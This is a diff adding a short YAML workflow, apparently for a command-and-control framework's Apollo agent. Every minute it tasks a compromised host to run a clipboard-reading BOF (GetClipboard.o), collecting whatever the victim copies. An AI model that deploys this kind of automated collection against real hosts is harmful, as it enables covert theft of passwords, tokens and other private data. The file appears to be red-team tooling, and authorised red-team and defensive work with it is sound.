@@ -1,0 +1,26 @@
+name: "Clipboard Monitor - Apollo"
+description: "Poll clipboard every 60 seconds on a callback"
+trigger: cron
+trigger_data:
+  cron: "*/1 * * * *"   # every 60 seconds
+keywords:
+  - apollo_callback
+environment: {}
+
+# uses a forked GetClipboard BOF from https://github.com/atomiczsec/BOF_Collection/tree/master/Collection/Clipboard
+
+steps:
+  - name: "GetClipboard"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: execute_coff
+      params: |
+        {
+          "coff_name": "GetClipboard.o",
+          "function": "go",
+          "serialized_arguments": "00000000"
+        }
